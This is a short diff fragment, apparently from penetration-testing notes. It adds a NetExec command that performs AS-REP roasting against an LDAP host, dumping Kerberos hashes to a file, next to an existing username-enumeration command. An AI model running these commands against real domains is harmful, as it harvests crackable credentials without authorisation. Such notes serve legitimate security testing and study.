@@ -93,6 +93,7 @@ run
 
 
 nxc ldap 192.168.154.134 -u "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" -p '' -k
+nxc ldap 192.168.1.48 -u "users.txt" -p '' --asreproast output.txt
 
 
 
